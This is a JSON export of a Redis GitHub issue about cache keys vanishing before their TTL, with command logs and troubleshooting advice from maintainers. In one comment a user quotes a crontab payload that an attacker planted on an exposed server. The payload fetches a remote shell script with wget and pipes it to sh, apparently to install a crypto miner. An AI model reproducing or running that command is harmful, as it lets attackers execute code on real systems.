@@ -1,0 +1,72 @@
+{
+  "issue_number": 8123.0,
+  "title": "[BUG] redis key getting deleted even it has enough TTL",
+  "body": "**Describe the bug**\r\n\r\nWe have observed on our redis instance key got removed even application not triggering any delete and also key has enough TTL.   \r\n\r\n```\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8”\r\n(integer) 86255\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8\"\r\n(integer) 86250\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8”\r\n(integer) 86243\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8\"\r\n(integer) 86237\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8”\r\n(integer) 86231\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8\"\r\n(integer) 86226\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8”\r\n(integer) -2\r\n127.0.0.1:6379[1]> ttl  “zc:k:07f_11ee7dd9a943f78bd3e86265eed6afb4_product_all_rules_2_mobile_1_1_2_3_4_5_8\"\r\n(integer) 86400\r\n127.0.0.1:6379[1]>\r\n\r\n```\r\n**To reproduce**\r\n\r\nNo exact steps we have to reproduce.\r\n\r\n**Expected behavior**\r\n\r\nFrom application side setting TTL of 24h. Key should not be deleted before that.\r\n\r\n**Additional information**\r\n\r\nNot sure if other keys are also getting deleted. But when this key is not there we see relevant sql DB queries are increasing. Here i attached monitoring screen shot for a key and we see it's not there after few secs and new key got created again with updated TTL.\r\n",
+  "state": "closed",
+  "created_at": "2020-12-02T17:04:25Z",
+  "updated_at": "2024-02-17T09:38:56Z",
+  "closed_at": "2021-07-12T12:17:15Z",
+  "labels": [],
+  "comments_data": [
+    {
+      "id": 737367783,
+      "user": "bhaveshrenpara",
+      "created_at": "2020-12-02T17:08:47Z",
+      "body": "Attached current config of redis server.\r\n[Redis_config_aahr_abhr.txt](https://github.com/redis/redis/files/5630857/Redis_config_aahr_abhr.txt)\r\n"
+    },
+    {
+      "id": 737797454,
+      "user": "oranagra",
+      "created_at": "2020-12-03T09:47:11Z",
+      "body": "the only candidates i can think of for the key to disappear are eviction, DEL/UNLINK/RENAME/MOVE, etc. \r\nfrom the config file you uploaded i see `maxmemory` is not defined, any chance it is set later by a CONFIG SET command?\r\n\r\nif you can reproduce this, maybe enabling keyspace notification will reveal what happened to that key."
+    },
+    {
+      "id": 738013511,
+      "user": "bhaveshrenpara",
+      "created_at": "2020-12-03T14:03:13Z",
+      "body": "Hi,\r\n\r\nIn monitoring we do not see any such command been executed on these keys. But still keys are getting removed. In bleow monitor output we can see high expiry was set but we see at short interval again key we are creating. There is no delete command we see in between. \r\n\r\n\r\n```\r\n\"t\" \"07f_APPLICATION_CACHE\" \"m\" \"1606994953\" \"i\" \"0\"\r\n1606994953.671130 [1 195.233.7.213:40690] \"expire\" \"zc:k:07f_303003e12a806d809a98e40e00c50a49_d2677a009371e1063d0456f634ce65a3\" \"86400\"\r\n1606994953.671641 [1 195.233.7.213:40690] \"hget\" \"zc:k:07f_303003e12a806d809a98e40e00c50a49_d2677a009371e1063d0456f634ce65a3\" \"d\"\r\n1606995004.540890 [1 195.233.7.223:58324] \"hget\" \"zc:k:07f_303003e12a806d809a98e40e00c50a49_d2677a009371e1063d0456f634ce65a3\" \"d\"\r\n1606995054.076667 [1 195.233.7.221:40680] \"hget\" \"zc:k:07f_303003e12a806d809a98e40e00c50a49_d2677a009371e1063d0456f634ce65a3\" \"d\"\r\n1606995054.089001 [1 195.233.7.221:40680] \"hget\" \"zc:k:07f_303003e12a806d809a98e40e00c50a49_d2677a009371e1063d0456f634ce65a3\" \"t\"\r\n1606995054.092210 [1 195.233.7.221:40680] \"hmset\" \"zc:k:07f_303003e12a806d809a98e40e00c50a49_d2677a009371e1063d0456f634ce65a3\" \"d\"\r\n\r\n```\r\n\r\n"
+    },
+    {
+      "id": 738029881,
+      "user": "bhaveshrenpara",
+      "created_at": "2020-12-03T14:30:45Z",
+      "body": "We see on servers we have THP is enabled. Could be responsible for this behaviour ?"
+    },
+    {
+      "id": 738043080,
+      "user": "oranagra",
+      "created_at": "2020-12-03T14:50:32Z",
+      "body": "THP can cause latency, but not bugs or misbehavior.\r\nMONITOR will only show user actions, if you'll enable keyspace notification and subscribe for them, you should be able to see other types of deletions (like eviction, expiration, and so on..)\r\n"
+    },
+    {
+      "id": 878220455,
+      "user": "DetachHead",
+      "created_at": "2021-07-12T12:02:10Z",
+      "body": "not sure if this helps but i had the same issue where keys with no ttl were being wiped. turns out our redis server was exposed and some crawler was wiping all our keys and replacing them with these:\r\n\r\n```\r\n127.0.0.1:6379> KEYS '*'\r\n1) \"backup2\"\r\n2) \"backup4\"\r\n3) \"backup3\"\r\n4) \"backup1\"\r\n127.0.0.1:6379> GET backup2\r\n\"\\n\\n\\n*/3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh\\n\\n\"\r\n```\r\n\r\nwhich seems to be some sort of crypto miner"
+    },
+    {
+      "id": 878231267,
+      "user": "oranagra",
+      "created_at": "2021-07-12T12:17:15Z",
+      "body": "yeah, looks like someone was attempting to hack your system and run code on it via the crontab.\r\ni'd do `config get dir` and `config get dbfilename`, check if they succeeded to execute their code, in which case i'd wipe that system as being compromised.\r\n\r\nregarding the original issue, i'm going to close it.\r\ni assume it was either due to eviction, or due to some commands being run (DEL, FLUSHDB, etc).\r\nit would have been possible to prove that using `redis-cli monitor` or with a look at `INFO commandstats`, but it seems the opener moved along."
+    },
+    {
+      "id": 1325439446,
+      "user": "bhaveshrenpara",
+      "created_at": "2022-11-23T17:40:08Z",
+      "body": "This issue we had due to a wrong build functionality which was flushing the whole DB when it gets triggered."
+    },
+    {
+      "id": 1948133008,
+      "user": "KaranMane027",
+      "created_at": "2024-02-16T10:35:29Z",
+      "body": "@bhaveshrenpara  Can you tell me more about how you resolved this issue ?\r\n"
+    },
+    {
+      "id": 1949916635,
+      "user": "bhaveshrenpara",
+      "created_at": "2024-02-17T09:38:54Z",
+      "body": "In our case it was application issue. As part of an API call to application\r\nredis cache was getting flushed. In your case as well you can observe\r\nkeyspace size in garfana if all of sudden there is decrease in keyspace\r\nsize. Usually redis don’t delete any key unless eviction is configured.\r\n\r\nOn Fri 16. Feb 2024 at 11:35, KaranMane027 ***@***.***> wrote:\r\n\r\n> @bhaveshrenpara <https://github.com/bhaveshrenpara> Can you tell me more\r\n> about how you resolved this issue ?\r\n>\r\n> —\r\n> Reply to this email directly, view it on GitHub\r\n> <https://github.com/redis/redis/issues/8123#issuecomment-1948133008>, or\r\n> unsubscribe\r\n> <https://github.com/notifications/unsubscribe-auth/AHPFC675EOPCU6SUO27GFJTYT4Y75AVCNFSM4UKYV4BKU5DIOJSWCZC7NNSXTN2JONZXKZKDN5WW2ZLOOQ5TCOJUHAYTGMZQGA4A>\r\n> .\r\n> You are receiving this because you were mentioned.Message ID:\r\n> ***@***.***>\r\n>\r\n"
+    }
+  ]
+}
